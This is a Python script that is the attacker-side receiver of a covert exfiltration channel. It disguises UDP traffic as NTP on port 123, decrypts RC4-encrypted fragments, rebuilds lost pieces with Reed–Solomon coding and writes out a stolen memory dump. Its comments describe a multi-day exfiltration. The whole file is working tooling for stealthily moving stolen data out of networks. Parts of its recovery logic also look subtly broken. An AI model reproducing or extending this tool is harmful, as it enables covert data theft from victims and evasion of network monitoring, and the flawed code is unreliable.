#!/usr/bin/env python3
import socket
import struct
import sys
import zlib
import logging
import time

# --- Parameters ---
BLOCK_SIZE = 10         # Number of data fragments per RS block
FRAGMENT_SIZE = 2       # Each fragment carries 2 useful bytes
RC4_KEY = b"MySecretKey"  # Same key as the client

# Timeout and buffer size
BASE_TIMEOUT = 60 * 60 * 24 * 5   # Global timeout in seconds (5 days)
SOCKET_RCVBUF_SIZE = 1 << 20

# Logging configuration (system messages in English)
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

# --- GF(256) initialization for Reed–Solomon ---
GF_EXP = [0] * 512
GF_LOG = [0] * 256

def init_gf():
    # Build exponential and logarithm tables for GF(256)
    x = 1
    for i in range(255):
        GF_EXP[i] = x
        GF_LOG[x] = i
        x <<= 1
        if x & 0x100:
            x ^= 0x11d
    for i in range(255, 512):
        GF_EXP[i] = GF_EXP[i - 255]

init_gf()

def gf_mul(a, b):
    # Multiply two elements in GF(256)
    if a == 0 or b == 0:
        return 0
    return GF_EXP[(GF_LOG[a] + GF_LOG[b]) % 255]

def gf_inv(a):
    # Compute multiplicative inverse in GF(256)
    if a == 0:
        raise ZeroDivisionError("GF(256) inverse of 0")
    return GF_EXP[255 - GF_LOG[a]]

# --- RC4 functions ---
def rc4_init(key):
    # Initialize RC4 state with the given key
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def rc4_stream(S, length):
    # Generate 'length' bytes of RC4 keystream
    i = j = 0
    stream = []
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        stream.append(S[(S[i] + S[j]) % 256])
    return stream

def rc4_decrypt(encrypted, key, skip):
    # Decrypt 'encrypted' bytes after skipping 'skip' bytes of keystream
    S = rc4_init(key)
    _ = rc4_stream(S, skip)
    ks = rc4_stream(S, len(encrypted))
    return bytes([c ^ k for c, k in zip(encrypted, ks)])

def try_decrypt(encrypted, key, skip):
    # Attempt RC4 decryption and return the 32-bit value
    dec = rc4_decrypt(encrypted, key, skip)
    val = struct.unpack(">I", dec)[0]
    return val, dec

def deduce_skip(encrypted, key, total_fragments, is_fec=False):
    # Determine how many keystream bytes to skip
    for skip in range(256):
        val, _ = try_decrypt(encrypted, key, skip)
        seq = val >> 16
        if not is_fec:
            if seq < total_fragments:
                return skip, val
        else:
            if seq >= total_fragments:
                return skip, val
    return None, None

# --- RS decoding via Gaussian elimination over GF(256) ---
def rs_solve(equations, k):
    n = len(equations)
    A = [row + [y] for row, y in equations]
    for col in range(k):
        # find pivot
        pivot = next((r for r in range(col, n) if A[r][col] != 0), None)
        if pivot is None:
            raise ValueError("Singular system, not enough independent equations")
        A[col], A[pivot] = A[pivot], A[col]
        inv_p = gf_inv(A[col][col])
        # normalize row
        for j in range(col, k+1):
            A[col][j] = gf_mul(A[col][j], inv_p)
        # eliminate others
        for r in range(n):
            if r != col and A[r][col] != 0:
                factor = A[r][col]
                for j in range(col, k+1):
                    A[r][j] ^= gf_mul(factor, A[col][j])
    return [A[i][k] for i in range(k)]

def build_equations(block_data, fec_data, k_block, pos):
    equations = []
    for i in range(k_block):
        if i in block_data:
            row = [0]*k_block
            row[i] = 1
            y = block_data[i][pos]
            equations.append((row, y))
    for j, val in fec_data.items():
        row = [GF_EXP[(i*(j+1)) % 255] for i in range(k_block)]
        equations.append((row, val[pos]))
    return equations

def rs_decode_block(block_data, fec_data, k_block):
    eq0 = build_equations(block_data, fec_data, k_block, 0)
    if len(eq0) < k_block:
        raise ValueError("Not enough equations to solve RS")
    sol0 = rs_solve(eq0[:k_block], k_block)
    eq1 = build_equations(block_data, fec_data, k_block, 1)
    sol1 = rs_solve(eq1[:k_block], k_block)
    recovered = {}
    for i in range(k_block):
        if i not in block_data:
            recovered[i] = bytes([sol0[i], sol1[i]])
    return recovered

# --- Receiver and reassembly logic ---
def run_receiver(host, port, output_file, base_timeout=BASE_TIMEOUT):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((host, port))
    except Exception as e:
        logging.error(f"Error binding to port {port}: {e}")
        sys.exit(1)
    sock.settimeout(5)
    logging.info(f"Listening on {host}:{port} ...")

    header_received = False
    total_fragments = total_size = 0
    data_packets = {}
    fec_packets = {}
    start = time.time()
    sender = None

    logging.info("Waiting for header...")
    while True:
        try:
            pkt, addr = sock.recvfrom(1024)
        except socket.timeout:
            if time.time() - start > base_timeout:
                logging.warning("Global timeout reached, stopping reception.")
                break
            continue

        if sender is None:
            sender = addr

        if len(pkt) < 48:
            continue

        payload = pkt[40:48]
        if not header_received:
            total_fragments = struct.unpack(">I", payload[:4])[0]
            total_size      = struct.unpack(">I", payload[4:8])[0]
            header_received = True
            logging.info(f"Header received: {total_fragments} fragments, {total_size} bytes compressed.")
            continue

        encrypted = payload[4:8]
        skip, val = deduce_skip(encrypted, RC4_KEY, total_fragments, is_fec=False)
        if skip is not None:
            seq  = val >> 16
            frag = val & 0xFFFF
            data_packets[seq] = frag.to_bytes(2, 'big')
            prog = len(data_packets)/total_fragments * 100
            logging.info(f"Progress: {len(data_packets)}/{total_fragments} ({prog:.1f}%)")
        else:
            skip, val = deduce_skip(encrypted, RC4_KEY, total_fragments, is_fec=True)
            if skip is not None:
                seq_high    = val >> 16
                bidx, idx   = divmod(seq_high, BLOCK_SIZE)
                fec_packets[(bidx, idx)] = (val & 0xFFFF).to_bytes(2, 'big')
                logging.info(f"FEC packet: block {bidx}, idx {idx}")
            else:
                logging.warning("Unable to deduce skip for packet; skipping.")

        if len(data_packets) == total_fragments:
            logging.info("All data packets received.")
            break

    sock.close()
    logging.info(f"Reception ended: {len(data_packets)}/{total_fragments} received.")

    # Reassemble in blocks
    num_blocks = (total_fragments + BLOCK_SIZE - 1)//BLOCK_SIZE
    reconstructed = bytearray(total_fragments * FRAGMENT_SIZE)
    logging.info("Reconstructing dump ...")
    for b in range(num_blocks):
        start_idx = b*BLOCK_SIZE
        k_block   = min(BLOCK_SIZE, total_fragments - start_idx)
        bd0, bd1  = {}, {}
        for i in range(k_block):
            seq = start_idx + i
            if seq in data_packets:
                val = data_packets[seq]
                bd0[i], bd1[i] = val[0], val[1]
        fd0, fd1 = {}, {}
        for j in range(BLOCK_SIZE):
            key = (b, j)
            if key in fec_packets:
                val = fec_packets[key]
                fd0[j], fd1[j] = val[0], val[1]
        if len(bd0) < k_block:
            try:
                rec0 = rs_decode_block(bd0, fd0, k_block)
                rec1 = rs_decode_block(bd1, fd1, k_block)
                for i in range(k_block):
                    if i not in bd0:
                        data_packets[start_idx + i] = rec0[i]
                        data_packets[start_idx + i] = rec1[i]
                        logging.info(f"Recovered fragment {start_idx+i} via RS")
            except Exception as e:
                logging.error(f"RS decode failed for block {b}: {e}")
        for i in range(k_block):
            frag = data_packets.get(start_idx+i, b'\x00\x00')
            reconstructed[(start_idx+i)*2:(start_idx+i)*2+2] = frag
        # progress bar omitted for brevity

    reconstructed = reconstructed[:total_size]
    try:
        dump = zlib.decompress(reconstructed)
        with open(output_file, "wb") as f:
            f.write(dump)
        logging.info(f"Dump written to {output_file}")
    except Exception as e:
        logging.error(f"Decompression failed: {e}")
        with open(output_file+".compressed", "wb") as f:
            f.write(reconstructed)
        logging.info(f"Compressed dump saved to {output_file}.compressed")

    # send feedback
    missing = [i for i in range(total_fragments) if i not in data_packets]
    if missing and sender:
        logging.info(f"Missing after RS: {missing}")
        fb = struct.pack(">I", len(missing))
        for seq in missing:
            fb += struct.pack(">I", seq)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(fb, (sender[0], 124))
            logging.info(f"Feedback sent to {sender[0]}:124")

if __name__ == '__main__':
    host        = "0.0.0.0"  
    port        = 123        # requires privileges on Linux
    output_file = "dump_memory.bin"
    # allow up to 5 days for a ~4-day exfiltration
    run_receiver(host, port, output_file, base_timeout=BASE_TIMEOUT)
